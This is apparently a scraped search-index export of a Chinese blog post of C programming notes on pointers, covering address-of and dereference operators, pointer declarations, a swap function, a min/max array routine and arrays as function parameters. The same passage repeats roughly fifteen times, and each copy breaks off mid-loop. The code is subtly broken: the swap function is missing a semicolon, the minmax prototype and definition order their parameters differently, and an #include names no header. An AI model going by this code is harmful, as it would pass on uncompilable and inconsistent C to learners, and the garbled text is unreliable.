指针应用\r交换两个变量的值 void swap(int *pa,int *pb) { int t = *pa; *pa = *pb *pb = t; } 寻找数组中最大值和最小值 #include void minmax(int a[], int len, int* max, int* min); int main() { int a[] = { 1,2,3,4,5,6,7,8,9,0,33,55 }; int min, max; minmax(a, sizeof(a) / sizeof(a[0]), \u0026min, \u0026max); printf(\"min=%d,max=%d\\n\", min, max); return 0; } void minmax(int a[], int len, int* min, int* max) { int i; *min = *max = a[0]; for (i = 1; i \u003c len; ++i) { if (a[i] \u003c *min) { *min = a[i]; } if (a[i] \u003e *max) { *max = a[i]; } } } 指针常见的错误定义了指针变量，还没有指向任何变量，就开始使用指针 另外，++*p、(*p)++都是将指针p所指向的变量值加1，而表达式*p++等价于*(p++)随后p不再指向变量a 传入函数的数组函数表中的数组实际上是指针 sizeof(a)==sizeof(int*) 但是可以用数组的运算符[]进行运算 数组名作为函数的参数数组的形参a实际上是一个指针，进行参数传递时，主函数传递的是数组a的基地址，数组元素本身不被复制。 int sum(int a[ ],int n){ int i,s =0; for(i=0;i","date":"2023-11-17","objectID":"/c_language_notes/:9:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#运算符-1"},{"categories":["Programing"],"content":"\r9.1指针\r运算符\u0026 scanf(\"%d\",\u0026i); 获得变量地址，只能对变量取地址 输出地址 printf(\"%p\\n\",\u0026i); 指针 int* p = \u0026i; 表示内存地址的变量 星号可以靠近p也可以靠近int，但 int* p,q; *p是一个指针变量，而q是普通变量 指针定义 int *p; //定义一个指针变量p,指向整型变量 char *cp; //定义一个指针变量cp，指向字符型变量 float *fp; double *dp1，*dp2; //定义多个指针时，每个变量名前都要加上* 不同的类型名代表该指针所指向的内存空间上所存放的数据的类型 作为参数的指针 void f(int *p); 在被调用的时候得到了某个变量的地址： int i = 0; f(\u0026i); 访问地址上的变量**(指针声明符)是一个单目运算符(运算的优先级较高)，用来访问指针的值所表示的地址上的变量 指针应用\r交换两个变量的值 void swap(int *pa,int *pb) { int t = *pa; *pa = *pb *pb = t; } 寻找数组中最大值和最小值 #include void minmax(int a[], int len, int* max, int* min); int main() { int a[] = { 1,2,3,4,5,6,7,8,9,0,33,55 }; int min, max; minmax(a, sizeof(a) / sizeof(a[0]), \u0026min, \u0026max); printf(\"min=%d,max=%d\\n\", min, max); return 0; } void minmax(int a[], int len, int* min, int* max) { int i; *min = *max = a[0]; for (i = 1; i \u003c len; ++i) { if (a[i] \u003c *min) { *min = a[i]; } if (a[i] \u003e *max) { *max = a[i]; } } } 指针常见的错误定义了指针变量，还没有指向任何变量，就开始使用指针 另外，++*p、(*p)++都是将指针p所指向的变量值加1，而表达式*p++等价于*(p++)随后p不再指向变量a 传入函数的数组函数表中的数组实际上是指针 sizeof(a)==sizeof(int*) 但是可以用数组的运算符[]进行运算 数组名作为函数的参数数组的形参a实际上是一个指针，进行参数传递时，主函数传递的是数组a的基地址，数组元素本身不被复制。 int sum(int a[ ],int n){ int i,s =0; for(i=0;i","date":"2023-11-17","objectID":"/c_language_notes/:9:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#输出地址"},{"categories":["Programing"],"content":"\r9.1指针\r运算符\u0026 scanf(\"%d\",\u0026i); 获得变量地址，只能对变量取地址 输出地址 printf(\"%p\\n\",\u0026i); 指针 int* p = \u0026i; 表示内存地址的变量 星号可以靠近p也可以靠近int，但 int* p,q; *p是一个指针变量，而q是普通变量 指针定义 int *p; //定义一个指针变量p,指向整型变量 char *cp; //定义一个指针变量cp，指向字符型变量 float *fp; double *dp1，*dp2; //定义多个指针时，每个变量名前都要加上* 不同的类型名代表该指针所指向的内存空间上所存放的数据的类型 作为参数的指针 void f(int *p); 在被调用的时候得到了某个变量的地址： int i = 0; f(\u0026i); 访问地址上的变量**(指针声明符)是一个单目运算符(运算的优先级较高)，用来访问指针的值所表示的地址上的变量 指针应用\r交换两个变量的值 void swap(int *pa,int *pb) { int t = *pa; *pa = *pb *pb = t; } 寻找数组中最大值和最小值 #include void minmax(int a[], int len, int* max, int* min); int main() { int a[] = { 1,2,3,4,5,6,7,8,9,0,33,55 }; int min, max; minmax(a, sizeof(a) / sizeof(a[0]), \u0026min, \u0026max); printf(\"min=%d,max=%d\\n\", min, max); return 0; } void minmax(int a[], int len, int* min, int* max) { int i; *min = *max = a[0]; for (i = 1; i \u003c len; ++i) { if (a[i] \u003c *min) { *min = a[i]; } if (a[i] \u003e *max) { *max = a[i]; } } } 指针常见的错误定义了指针变量，还没有指向任何变量，就开始使用指针 另外，++*p、(*p)++都是将指针p所指向的变量值加1，而表达式*p++等价于*(p++)随后p不再指向变量a 传入函数的数组函数表中的数组实际上是指针 sizeof(a)==sizeof(int*) 但是可以用数组的运算符[]进行运算 数组名作为函数的参数数组的形参a实际上是一个指针，进行参数传递时，主函数传递的是数组a的基地址，数组元素本身不被复制。 int sum(int a[ ],int n){ int i,s =0; for(i=0;i","date":"2023-11-17","objectID":"/c_language_notes/:9:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#指针"},{"categories":["Programing"],"content":"\r9.1指针\r运算符\u0026 scanf(\"%d\",\u0026i); 获得变量地址，只能对变量取地址 输出地址 printf(\"%p\\n\",\u0026i); 指针 int* p = \u0026i; 表示内存地址的变量 星号可以靠近p也可以靠近int，但 int* p,q; *p是一个指针变量，而q是普通变量 指针定义 int *p; //定义一个指针变量p,指向整型变量 char *cp; //定义一个指针变量cp，指向字符型变量 float *fp; double *dp1，*dp2; //定义多个指针时，每个变量名前都要加上* 不同的类型名代表该指针所指向的内存空间上所存放的数据的类型 作为参数的指针 void f(int *p); 在被调用的时候得到了某个变量的地址： int i = 0; f(\u0026i); 访问地址上的变量**(指针声明符)是一个单目运算符(运算的优先级较高)，用来访问指针的值所表示的地址上的变量 指针应用\r交换两个变量的值 void swap(int *pa,int *pb) { int t = *pa; *pa = *pb *pb = t; } 寻找数组中最大值和最小值 #include void minmax(int a[], int len, int* max, int* min); int main() { int a[] = { 1,2,3,4,5,6,7,8,9,0,33,55 }; int min, max; minmax(a, sizeof(a) / sizeof(a[0]), \u0026min, \u0026max); printf(\"min=%d,max=%d\\n\", min, max); return 0; } void minmax(int a[], int len, int* min, int* max) { int i; *min = *max = a[0]; for (i = 1; i \u003c len; ++i) { if (a[i] \u003c *min) { *min = a[i]; } if (a[i] \u003e *max) { *max = a[i]; } } } 指针常见的错误定义了指针变量，还没有指向任何变量，就开始使用指针 另外，++*p、(*p)++都是将指针p所指向的变量值加1，而表达式*p++等价于*(p++)随后p不再指向变量a 传入函数的数组函数表中的数组实际上是指针 sizeof(a)==sizeof(int*) 但是可以用数组的运算符[]进行运算 数组名作为函数的参数数组的形参a实际上是一个指针，进行参数传递时，主函数传递的是数组a的基地址，数组元素本身不被复制。 int sum(int a[ ],int n){ int i,s =0; for(i=0;i","date":"2023-11-17","objectID":"/c_language_notes/:9:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#指针定义"},{"categories":["Programing"],"content":"\r9.1指针\r运算符\u0026 scanf(\"%d\",\u0026i); 获得变量地址，只能对变量取地址 输出地址 printf(\"%p\\n\",\u0026i); 指针 int* p = \u0026i; 表示内存地址的变量 星号可以靠近p也可以靠近int，但 int* p,q; *p是一个指针变量，而q是普通变量 指针定义 int *p; //定义一个指针变量p,指向整型变量 char *cp; //定义一个指针变量cp，指向字符型变量 float *fp; double *dp1，*dp2; //定义多个指针时，每个变量名前都要加上* 不同的类型名代表该指针所指向的内存空间上所存放的数据的类型 作为参数的指针 void f(int *p); 在被调用的时候得到了某个变量的地址： int i = 0; f(\u0026i); 访问地址上的变量**(指针声明符)是一个单目运算符(运算的优先级较高)，用来访问指针的值所表示的地址上的变量 指针应用\r交换两个变量的值 void swap(int *pa,int *pb) { int t = *pa; *pa = *pb *pb = t; } 寻找数组中最大值和最小值 #include void minmax(int a[], int len, int* max, int* min); int main() { int a[] = { 1,2,3,4,5,6,7,8,9,0,33,55 }; int min, max; minmax(a, sizeof(a) / sizeof(a[0]), \u0026min, \u0026max); printf(\"min=%d,max=%d\\n\", min, max); return 0; } void minmax(int a[], int len, int* min, int* max) { int i; *min = *max = a[0]; for (i = 1; i \u003c len; ++i) { if (a[i] \u003c *min) { *min = a[i]; } if (a[i] \u003e *max) { *max = a[i]; } } } 指针常见的错误定义了指针变量，还没有指向任何变量，就开始使用指针 另外，++*p、(*p)++都是将指针p所指向的变量值加1，而表达式*p++等价于*(p++)随后p不再指向变量a 传入函数的数组函数表中的数组实际上是指针 sizeof(a)==sizeof(int*) 但是可以用数组的运算符[]进行运算 数组名作为函数的参数数组的形参a实际上是一个指针，进行参数传递时，主函数传递的是数组a的基地址，数组元素本身不被复制。 int sum(int a[ ],int n){ int i,s =0; for(i=0;i","date":"2023-11-17","objectID":"/c_language_notes/:9:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#作为参数的指针"},{"categories":["Programing"],"content":"\r9.1指针\r运算符\u0026 scanf(\"%d\",\u0026i); 获得变量地址，只能对变量取地址 输出地址 printf(\"%p\\n\",\u0026i); 指针 int* p = \u0026i; 表示内存地址的变量 星号可以靠近p也可以靠近int，但 int* p,q; *p是一个指针变量，而q是普通变量 指针定义 int *p; //定义一个指针变量p,指向整型变量 char *cp; //定义一个指针变量cp，指向字符型变量 float *fp; double *dp1，*dp2; //定义多个指针时，每个变量名前都要加上* 不同的类型名代表该指针所指向的内存空间上所存放的数据的类型 作为参数的指针 void f(int *p); 在被调用的时候得到了某个变量的地址： int i = 0; f(\u0026i); 访问地址上的变量**(指针声明符)是一个单目运算符(运算的优先级较高)，用来访问指针的值所表示的地址上的变量 指针应用\r交换两个变量的值 void swap(int *pa,int *pb) { int t = *pa; *pa = *pb *pb = t; } 寻找数组中最大值和最小值 #include void minmax(int a[], int len, int* max, int* min); int main() { int a[] = { 1,2,3,4,5,6,7,8,9,0,33,55 }; int min, max; minmax(a, sizeof(a) / sizeof(a[0]), \u0026min, \u0026max); printf(\"min=%d,max=%d\\n\", min, max); return 0; } void minmax(int a[], int len, int* min, int* max) { int i; *min = *max = a[0]; for (i = 1; i \u003c len; ++i) { if (a[i] \u003c *min) { *min = a[i]; } if (a[i] \u003e *max) { *max = a[i]; } } } 指针常见的错误定义了指针变量，还没有指向任何变量，就开始使用指针 另外，++*p、(*p)++都是将指针p所指向的变量值加1，而表达式*p++等价于*(p++)随后p不再指向变量a 传入函数的数组函数表中的数组实际上是指针 sizeof(a)==sizeof(int*) 但是可以用数组的运算符[]进行运算 数组名作为函数的参数数组的形参a实际上是一个指针，进行参数传递时，主函数传递的是数组a的基地址，数组元素本身不被复制。 int sum(int a[ ],int n){ int i,s =0; for(i=0;i","date":"2023-11-17","objectID":"/c_language_notes/:9:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#访问地址上的变量"},{"categories":["Programing"],"content":"\r9.1指针\r运算符\u0026 scanf(\"%d\",\u0026i); 获得变量地址，只能对变量取地址 输出地址 printf(\"%p\\n\",\u0026i); 指针 int* p = \u0026i; 表示内存地址的变量 星号可以靠近p也可以靠近int，但 int* p,q; *p是一个指针变量，而q是普通变量 指针定义 int *p; //定义一个指针变量p,指向整型变量 char *cp; //定义一个指针变量cp，指向字符型变量 float *fp; double *dp1，*dp2; //定义多个指针时，每个变量名前都要加上* 不同的类型名代表该指针所指向的内存空间上所存放的数据的类型 作为参数的指针 void f(int *p); 在被调用的时候得到了某个变量的地址： int i = 0; f(\u0026i); 访问地址上的变量**(指针声明符)是一个单目运算符(运算的优先级较高)，用来访问指针的值所表示的地址上的变量 指针应用\r交换两个变量的值 void swap(int *pa,int *pb) { int t = *pa; *pa = *pb *pb = t; } 寻找数组中最大值和最小值 #include void minmax(int a[], int len, int* max, int* min); int main() { int a[] = { 1,2,3,4,5,6,7,8,9,0,33,55 }; int min, max; minmax(a, sizeof(a) / sizeof(a[0]), \u0026min, \u0026max); printf(\"min=%d,max=%d\\n\", min, max); return 0; } void minmax(int a[], int len, int* min, int* max) { int i; *min = *max = a[0]; for (i = 1; i \u003c len; ++i) { if (a[i] \u003c *min) { *min = a[i]; } if (a[i] \u003e *max) { *max = a[i]; } } } 指针常见的错误定义了指针变量，还没有指向任何变量，就开始使用指针 另外，++*p、(*p)++都是将指针p所指向的变量值加1，而表达式*p++等价于*(p++)随后p不再指向变量a 传入函数的数组函数表中的数组实际上是指针 sizeof(a)==sizeof(int*) 但是可以用数组的运算符[]进行运算 数组名作为函数的参数数组的形参a实际上是一个指针，进行参数传递时，主函数传递的是数组a的基地址，数组元素本身不被复制。 int sum(int a[ ],int n){ int i,s =0; for(i=0;i","date":"2023-11-17","objectID":"/c_language_notes/:9:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#指针应用"},{"categories":["Programing"],"content":"\r9.1指针\r运算符\u0026 scanf(\"%d\",\u0026i); 获得变量地址，只能对变量取地址 输出地址 printf(\"%p\\n\",\u0026i); 指针 int* p = \u0026i; 表示内存地址的变量 星号可以靠近p也可以靠近int，但 int* p,q; *p是一个指针变量，而q是普通变量 指针定义 int *p; //定义一个指针变量p,指向整型变量 char *cp; //定义一个指针变量cp，指向字符型变量 float *fp; double *dp1，*dp2; //定义多个指针时，每个变量名前都要加上* 不同的类型名代表该指针所指向的内存空间上所存放的数据的类型 作为参数的指针 void f(int *p); 在被调用的时候得到了某个变量的地址： int i = 0; f(\u0026i); 访问地址上的变量**(指针声明符)是一个单目运算符(运算的优先级较高)，用来访问指针的值所表示的地址上的变量 指针应用\r交换两个变量的值 void swap(int *pa,int *pb) { int t = *pa; *pa = *pb *pb = t; } 寻找数组中最大值和最小值 #include void minmax(int a[], int len, int* max, int* min); int main() { int a[] = { 1,2,3,4,5,6,7,8,9,0,33,55 }; int min, max; minmax(a, sizeof(a) / sizeof(a[0]), \u0026min, \u0026max); printf(\"min=%d,max=%d\\n\", min, max); return 0; } void minmax(int a[], int len, int* min, int* max) { int i; *min = *max = a[0]; for (i = 1; i \u003c len; ++i) { if (a[i] \u003c *min) { *min = a[i]; } if (a[i] \u003e *max) { *max = a[i]; } } } 指针常见的错误定义了指针变量，还没有指向任何变量，就开始使用指针 另外，++*p、(*p)++都是将指针p所指向的变量值加1，而表达式*p++等价于*(p++)随后p不再指向变量a 传入函数的数组函数表中的数组实际上是指针 sizeof(a)==sizeof(int*) 但是可以用数组的运算符[]进行运算 数组名作为函数的参数数组的形参a实际上是一个指针，进行参数传递时，主函数传递的是数组a的基地址，数组元素本身不被复制。 int sum(int a[ ],int n){ int i,s =0; for(i=0;i","date":"2023-11-17","objectID":"/c_language_notes/:9:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#交换两个变量的值"},{"categories":["Programing"],"content":"\r9.1指针\r运算符\u0026 scanf(\"%d\",\u0026i); 获得变量地址，只能对变量取地址 输出地址 printf(\"%p\\n\",\u0026i); 指针 int* p = \u0026i; 表示内存地址的变量 星号可以靠近p也可以靠近int，但 int* p,q; *p是一个指针变量，而q是普通变量 指针定义 int *p; //定义一个指针变量p,指向整型变量 char *cp; //定义一个指针变量cp，指向字符型变量 float *fp; double *dp1，*dp2; //定义多个指针时，每个变量名前都要加上* 不同的类型名代表该指针所指向的内存空间上所存放的数据的类型 作为参数的指针 void f(int *p); 在被调用的时候得到了某个变量的地址： int i = 0; f(\u0026i); 访问地址上的变量**(指针声明符)是一个单目运算符(运算的优先级较高)，用来访问指针的值所表示的地址上的变量 指针应用\r交换两个变量的值 void swap(int *pa,int *pb) { int t = *pa; *pa = *pb *pb = t; } 寻找数组中最大值和最小值 #include void minmax(int a[], int len, int* max, int* min); int main() { int a[] = { 1,2,3,4,5,6,7,8,9,0,33,55 }; int min, max; minmax(a, sizeof(a) / sizeof(a[0]), \u0026min, \u0026max); printf(\"min=%d,max=%d\\n\", min, max); return 0; } void minmax(int a[], int len, int* min, int* max) { int i; *min = *max = a[0]; for (i = 1; i \u003c len; ++i) { if (a[i] \u003c *min) { *min = a[i]; } if (a[i] \u003e *max) { *max = a[i]; } } } 指针常见的错误定义了指针变量，还没有指向任何变量，就开始使用指针 另外，++*p、(*p)++都是将指针p所指向的变量值加1，而表达式*p++等价于*(p++)随后p不再指向变量a 传入函数的数组函数表中的数组实际上是指针 sizeof(a)==sizeof(int*) 但是可以用数组的运算符[]进行运算 数组名作为函数的参数数组的形参a实际上是一个指针，进行参数传递时，主函数传递的是数组a的基地址，数组元素本身不被复制。 int sum(int a[ ],int n){ int i,s =0; for(i=0;i","date":"2023-11-17","objectID":"/c_language_notes/:9:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#寻找数组中最大值和最小值"},{"categories":["Programing"],"content":"\r9.1指针\r运算符\u0026 scanf(\"%d\",\u0026i); 获得变量地址，只能对变量取地址 输出地址 printf(\"%p\\n\",\u0026i); 指针 int* p = \u0026i; 表示内存地址的变量 星号可以靠近p也可以靠近int，但 int* p,q; *p是一个指针变量，而q是普通变量 指针定义 int *p; //定义一个指针变量p,指向整型变量 char *cp; //定义一个指针变量cp，指向字符型变量 float *fp; double *dp1，*dp2; //定义多个指针时，每个变量名前都要加上* 不同的类型名代表该指针所指向的内存空间上所存放的数据的类型 作为参数的指针 void f(int *p); 在被调用的时候得到了某个变量的地址： int i = 0; f(\u0026i); 访问地址上的变量**(指针声明符)是一个单目运算符(运算的优先级较高)，用来访问指针的值所表示的地址上的变量 指针应用\r交换两个变量的值 void swap(int *pa,int *pb) { int t = *pa; *pa = *pb *pb = t; } 寻找数组中最大值和最小值 #include void minmax(int a[], int len, int* max, int* min); int main() { int a[] = { 1,2,3,4,5,6,7,8,9,0,33,55 }; int min, max; minmax(a, sizeof(a) / sizeof(a[0]), \u0026min, \u0026max); printf(\"min=%d,max=%d\\n\", min, max); return 0; } void minmax(int a[], int len, int* min, int* max) { int i; *min = *max = a[0]; for (i = 1; i \u003c len; ++i) { if (a[i] \u003c *min) { *min = a[i]; } if (a[i] \u003e *max) { *max = a[i]; } } } 指针常见的错误定义了指针变量，还没有指向任何变量，就开始使用指针 另外，++*p、(*p)++都是将指针p所指向的变量值加1，而表达式*p++等价于*(p++)随后p不再指向变量a 传入函数的数组函数表中的数组实际上是指针 sizeof(a)==sizeof(int*) 但是可以用数组的运算符[]进行运算 数组名作为函数的参数数组的形参a实际上是一个指针，进行参数传递时，主函数传递的是数组a的基地址，数组元素本身不被复制。 int sum(int a[ ],int n){ int i,s =0; for(i=0;i","date":"2023-11-17","objectID":"/c_language_notes/:9:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#指针常见的错误"},{"categories":["Programing"],"content":"\r9.1指针\r运算符\u0026 scanf(\"%d\",\u0026i); 获得变量地址，只能对变量取地址 输出地址 printf(\"%p\\n\",\u0026i); 指针 int* p = \u0026i; 表示内存地址的变量 星号可以靠近p也可以靠近int，但 int* p,q; *p是一个指针变量，而q是普通变量 指针定义 int *p; //定义一个指针变量p,指向整型变量 char *cp; //定义一个指针变量cp，指向字符型变量 float *fp; double *dp1，*dp2; //定义多个指针时，每个变量名前都要加上* 不同的类型名代表该指针所指向的内存空间上所存放的数据的类型 作为参数的指针 void f(int *p); 在被调用的时候得到了某个变量的地址： int i = 0; f(\u0026i); 访问地址上的变量**(指针声明符)是一个单目运算符(运算的优先级较高)，用来访问指针的值所表示的地址上的变量 指针应用\r交换两个变量的值 void swap(int *pa,int *pb) { int t = *pa; *pa = *pb *pb = t; } 寻找数组中最大值和最小值 #include void minmax(int a[], int len, int* max, int* min); int main() { int a[] = { 1,2,3,4,5,6,7,8,9,0,33,55 }; int min, max; minmax(a, sizeof(a) / sizeof(a[0]), \u0026min, \u0026max); printf(\"min=%d,max=%d\\n\", min, max); return 0; } void minmax(int a[], int len, int* min, int* max) { int i; *min = *max = a[0]; for (i = 1; i \u003c len; ++i) { if (a[i] \u003c *min) { *min = a[i]; } if (a[i] \u003e *max) { *max = a[i]; } } } 指针常见的错误定义了指针变量，还没有指向任何变量，就开始使用指针 另外，++*p、(*p)++都是将指针p所指向的变量值加1，而表达式*p++等价于*(p++)随后p不再指向变量a 传入函数的数组函数表中的数组实际上是指针 sizeof(a)==sizeof(int*) 但是可以用数组的运算符[]进行运算 数组名作为函数的参数数组的形参a实际上是一个指针，进行参数传递时，主函数传递的是数组a的基地址，数组元素本身不被复制。 int sum(int a[ ],int n){ int i,s =0; for(i=0;i","date":"2023-11-17","objectID":"/c_language_notes/:9:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#传入函数的数组"},{"categories":["Programing"],"content":"\r9.1指针\r运算符\u0026 scanf(\"%d\",\u0026i); 获得变量地址，只能对变量取地址 输出地址 printf(\"%p\\n\",\u0026i); 指针 int* p = \u0026i; 表示内存地址的变量 星号可以靠近p也可以靠近int，但 int* p,q; *p是一个指针变量，而q是普通变量 指针定义 int *p; //定义一个指针变量p,指向整型变量 char *cp; //定义一个指针变量cp，指向字符型变量 float *fp; double *dp1，*dp2; //定义多个指针时，每个变量名前都要加上* 不同的类型名代表该指针所指向的内存空间上所存放的数据的类型 作为参数的指针 void f(int *p); 在被调用的时候得到了某个变量的地址： int i = 0; f(\u0026i); 访问地址上的变量**(指针声明符)是一个单目运算符(运算的优先级较高)，用来访问指针的值所表示的地址上的变量 指针应用\r交换两个变量的值 void swap(int *pa,int *pb) { int t = *pa; *pa = *pb *pb = t; } 寻找数组中最大值和最小值 #include void minmax(int a[], int len, int* max, int* min); int main() { int a[] = { 1,2,3,4,5,6,7,8,9,0,33,55 }; int min, max; minmax(a, sizeof(a) / sizeof(a[0]), \u0026min, \u0026max); printf(\"min=%d,max=%d\\n\", min, max); return 0; } void minmax(int a[], int len, int* min, int* max) { int i; *min = *max = a[0]; for (i = 1; i \u003c len; ++i) { if (a[i] \u003c *min) { *min = a[i]; } if (a[i] \u003e *max) { *max = a[i]; } } } 指针常见的错误定义了指针变量，还没有指向任何变量，就开始使用指针 另外，++*p、(*p)++都是将指针p所指向的变量值加1，而表达式*p++等价于*(p++)随后p不再指向变量a 传入函数的数组函数表中的数组实际上是指针 sizeof(a)==sizeof(int*) 但是可以用数组的运算符[]进行运算 数组名作为函数的参数数组的形参a实际上是一个指针，进行参数传递时，主函数传递的是数组a的基地址，数组元素本身不被复制。 int sum(int a[ ],int n){ int i,s =0; for(i=0;i","date":"2023-11-17","objectID":"/c_language_notes/:9:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#数组名作为函数的参数"},{"categories":["Programing"],"content":"\r9.1指针\r运算符\u0026 scanf(\"%d\",\u0026i); 获得变量地址，只能对变量取地址 输出地址 printf(\"%p\\n\",\u0026i); 指针 int* p = \u0026i; 表示内存地址的变量 星号可以靠近p也可以靠近int，但 int* p,q; *p是一个指针变量，而q是普通变量 指针定义 int *p; //定义一个指针变量p,指向整型变量 char *cp; //定义一个指针变量cp，指向字符型变量 float *fp; double *dp1，*dp2; //定义多个指针时，每个变量名前都要加上* 不同的类型名代表该指针所指向的内存空间上所存放的数据的类型 作为参数的指针 void f(int *p); 在被调用的时候得到了某个变量的地址： int i = 0; f(\u0026i); 访问地址上的变量**(指针声明符)是一个单目运算符(运算的优先级较高)，用来访问指针的值所表示的地址上的变量 指针应用\r交换两个变量的值 void swap(int *pa,int *pb) { int t = *pa; *pa = *pb *pb = t; } 寻找数组中最大值和最小值 #include void minmax(int a[], int len, int* max, int* min); int main() { int a[] = { 1,2,3,4,5,6,7,8,9,0,33,55 }; int min, max; minmax(a, sizeof(a) / sizeof(a[0]), \u0026min, \u0026max); printf(\"min=%d,max=%d\\n\", min, max); return 0; } void minmax(int a[], int len, int* min, int* max) { int i; *min = *max = a[0]; for (i = 1; i \u003c len; ++i) { if (a[i] \u003c *min) { *min = a[i]; } if (a[i] \u003e *max) { *max = a[i]; } } } 指针常见的错误定义了指针变量，还没有指向任何变量，就开始使用指针 另外，++*p、(*p)++都是将指针p所指向的变量值加1，而表达式*p++等价于*(p++)随后p不再指向变量a 传入函数的数组函数表中的数组实际上是指针 sizeof(a)==sizeof(int*) 但是可以用数组的运算符[]进行运算 数组名作为函数的参数数组的形参a实际上是一个指针，进行参数传递时，主函数传递的是数组a的基地址，数组元素本身不被复制。 int sum(int a[ ],int n){ int i,s =0; for(i=0;i","date":"2023-11-17","objectID":"/c_language_notes/:9:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#数组变量是特殊的指针"},{"categories":["Programing"],"content":"\r9.1指针\r运算符\u0026 scanf(\"%d\",\u0026i); 获得变量地址，只能对变量取地址 输出地址 printf(\"%p\\n\",\u0026i); 指针 int* p = \u0026i; 表示内存地址的变量 星号可以靠近p也可以靠近int，但 int* p,q; *p是一个指针变量，而q是普通变量 指针定义 int *p; //定义一个指针变量p,指向整型变量 char *cp; //定义一个指针变量cp，指向字符型变量 float *fp; double *dp1，*dp2; //定义多个指针时，每个变量名前都要加上* 不同的类型名代表该指针所指向的内存空间上所存放的数据的类型 作为参数的指针 void f(int *p); 在被调用的时候得到了某个变量的地址： int i = 0; f(\u0026i); 访问地址上的变量**(指针声明符)是一个单目运算符(运算的优先级较高)，用来访问指针的值所表示的地址上的变量 指针应用\r交换两个变量的值 void swap(int *pa,int *pb) { int t = *pa; *pa = *pb *pb = t; } 寻找数组中最大值和最小值 #include void minmax(int a[], int len, int* max, int* min); int main() { int a[] = { 1,2,3,4,5,6,7,8,9,0,33,55 }; int min, max; minmax(a, sizeof(a) / sizeof(a[0]), \u0026min, \u0026max); printf(\"min=%d,max=%d\\n\", min, max); return 0; } void minmax(int a[], int len, int* min, int* max) { int i; *min = *max = a[0]; for (i = 1; i \u003c len; ++i) { if (a[i] \u003c *min) { *min = a[i]; } if (a[i] \u003e *max) { *max = a[i]; } } } 指针常见的错误定义了指针变量，还没有指向任何变量，就开始使用指针 另外，++*p、(*p)++都是将指针p所指向的变量值加1，而表达式*p++等价于*(p++)随后p不再指向变量a 传入函数的数组函数表中的数组实际上是指针 sizeof(a)==sizeof(int*) 但是可以用数组的运算符[]进行运算 数组名作为函数的参数数组的形参a实际上是一个指针，进行参数传递时，主函数传递的是数组a的基地址，数组元素本身不被复制。 int sum(int a[ ],int n){ int i,s =0; for(i=0;i","date":"2023-11-17","objectID":"/c_language_notes/:9:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#指针数组和地址间的关系"},{"categories":["Programing"],"content":"\r9.1指针\r运算符\u0026 scanf(\"%d\",\u0026i); 获得变量地址，只能对变量取地址 输出地址 printf(\"%p\\n\",\u0026i); 指针 int* p = \u0026i; 表示内存地址的变量 星号可以靠近p也可以靠近int，但 int* p,q; *p是一个指针变量，而q是普通变量 指针定义 int *p; //定义一个指针变量p,指向整型变量 char *cp; //定义一个指针变量cp，指向字符型变量 float *fp; double *dp1，*dp2; //定义多个指针时，每个变量名前都要加上* 不同的类型名代表该指针所指向的内存空间上所存放的数据的类型 作为参数的指针 void f(int *p); 在被调用的时候得到了某个变量的地址： int i = 0; f(\u0026i); 访问地址上的变量**(指针声明符)是一个单目运算符(运算的优先级较高)，用来访问指针的值所表示的地址上的变量 指针应用\r交换两个变量的值 void swap(int *pa,int *pb) { int t = *pa; *pa = *pb *pb = t; } 寻找数组中最大值和最小值 #include void minmax(int a[], int len, int* max, int* min); int main() { int a[] = { 1,2,3,4,5,6,7,8,9,0,33,55 }; int min, max; minmax(a, sizeof(a) / sizeof(a[0]), \u0026min, \u0026max); printf(\"min=%d,max=%d\\n\", min, max); return 0; } void minmax(int a[], int len, int* min, int* max) { int i; *min = *max = a[0]; for (i = 1; i \u003c len; ++i) { if (a[i] \u003c *min) { *min = a[i]; } if (a[i] \u003e *max) { *max = a[i]; } } } 指针常见的错误定义了指针变量，还没有指向任何变量，就开始使用指针 另外，++*p、(*p)++都是将指针p所指向的变量值加1，而表达式*p++等价于*(p++)随后p不再指向变量a 传入函数的数组函数表中的数组实际上是指针 sizeof(a)==sizeof(int*) 但是可以用数组的运算符[]进行运算 数组名作为函数的参数数组的形参a实际上是一个指针，进行参数传递时，主函数传递的是数组a的基地址，数组元素本身不被复制。 int sum(int a[ ],int n){ int i,s =0; for(i=0;i","date":"2023-11-17","objectID":"/c_language_notes/:9:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#通过指针实现数组求和"},{"categories":["Programing"],"content":"\r9.1指针\r运算符\u0026 scanf(\"%d\",\u0026i); 获得变量地址，只能对变量取地址 输出地址 printf(\"%p\\n\",\u0026i); 指针 int* p = \u0026i; 表示内存地址的变量 星号可以靠近p也可以靠近int，但 int* p,q; *p是一个指针变量，而q是普通变量 指针定义 int *p; //定义一个指针变量p,指向整型变量 char *cp; //定义一个指针变量cp，指向字符型变量 float *fp; double *dp1，*dp2; //定义多个指针时，每个变量名前都要加上* 不同的类型名代表该指针所指向的内存空间上所存放的数据的类型 作为参数的指针 void f(int *p); 在被调用的时候得到了某个变量的地址： int i = 0; f(\u0026i); 访问地址上的变量**(指针声明符)是一个单目运算符(运算的优先级较高)，用来访问指针的值所表示的地址上的变量 指针应用\r交换两个变量的值 void swap(int *pa,int *pb) { int t = *pa; *pa = *pb *pb = t; } 寻找数组中最大值和最小值 #include void minmax(int a[], int len, int* max, int* min); int main() { int a[] = { 1,2,3,4,5,6,7,8,9,0,33,55 }; int min, max; minmax(a, sizeof(a) / sizeof(a[0]), \u0026min, \u0026max); printf(\"min=%d,max=%d\\n\", min, max); return 0; } void minmax(int a[], int len, int* min, int* max) { int i; *min = *max = a[0]; for (i = 1; i \u003c len; ++i) { if (a[i] \u003c *min) { *min = a[i]; } if (a[i] 